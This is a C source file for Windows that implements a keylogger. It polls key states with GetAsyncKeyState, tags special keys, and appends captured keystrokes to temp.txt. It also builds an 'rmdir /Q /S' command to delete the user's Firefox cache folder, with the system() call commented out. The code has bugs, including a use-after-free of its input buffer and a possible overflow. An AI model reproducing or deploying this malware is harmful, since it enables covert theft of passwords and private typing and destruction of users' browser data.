#include <stdio.h>
#include <windows.h>

//functions to delete browser specific cache
void ClearBrowserCache();
void ClearMozillaCache();
void ClearChromeCache();
void ClearOperaCache(); 


//function to delete mozilla firefox cache
void ClearMozillaCache()
{
    char path[256] = "C:\\Users\\";
    char cachePath[256] = "\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\gv3rw9bw.default-release\\cache2";
    char removepath[256] = "";
    strcat(path,getenv("USERNAME"));
    strcat(path, cachePath);
    strcat(removepath,"rmdir /Q /S ");
    strcat(removepath, path);
    printf("path: %s\n remove path: %s\n",path,removepath);
    //system(removepath);

}

//function to call specific browser clear cache functions
void ClearBrowserCache()
{
    ClearMozillaCache();
    //to be added: more browser clear cache functions

}

void Save(int key, char* input)
{
    if(key == VK_BACK)
    {
        strcat(input, "[BackSpace]");
    }

    else if(key == VK_TAB)
    {
        strcat(input, "[TAB]");
    }

    else if(key == VK_RETURN)
    {
        strcat(input, "[ENTER]");
    }

    else if(key == VK_SHIFT)
    {
        strcat(input, "[SHIFT]");
    }

    else if(key == VK_CONTROL)
    {
        strcat(input, "[CTRL]");
    }

    else if(key == VK_MENU)
    {
        strcat(input, "[ALT]");
    }

    else if(key == VK_CAPITAL)
    {
        strcat(input,"[CAPSlOCK]");
    }

    else if(key == VK_ESCAPE)
    {
        strcat(input, "[ESC]");
    }

    else if(key == VK_SPACE)
    {
        strcat(input, "[SPACE]");
    }

    else if(key == VK_UP)
    {
        strcat(input, "[UP Arrow]");
    }

    else if(key == VK_DOWN)
    {
        strcat(input, "[DOWN ARROW]");
    }

    else if(key == VK_LEFT)
    {
        strcat(input, "[LEFT ARROW]");
    }

    else if(key == VK_RIGHT)
    {
        strcat(input, "[RIGHT ARROW]");
    }
    /*
    Add more use cases for keyboard layouts
    */
    else
    {
        char temp[2] = "";
        temp[0] = key;
        temp[1] = '\0';
        strcat(input,temp);
    }

}

int main()
{
    ClearMozillaCache();
    int counter = 0;
    char* input = (char*)malloc(100*sizeof(char));
    input[0]='\0';
    while(1)
    {
        for(int i=8; i<190; i++)
        {
            if(GetAsyncKeyState(i) == -32767)
            {
                //printf("%c", i);
                counter++;
                Save(i,input);
                if(counter == 10)
                {
                    counter = 0;
                    FILE *fp = fopen("temp.txt","ab+");
                    fprintf(fp,"%s", input);
                    fclose(fp);
                    free(input);
                    

                }            
                
            }
        }
    }
    return 0;
} 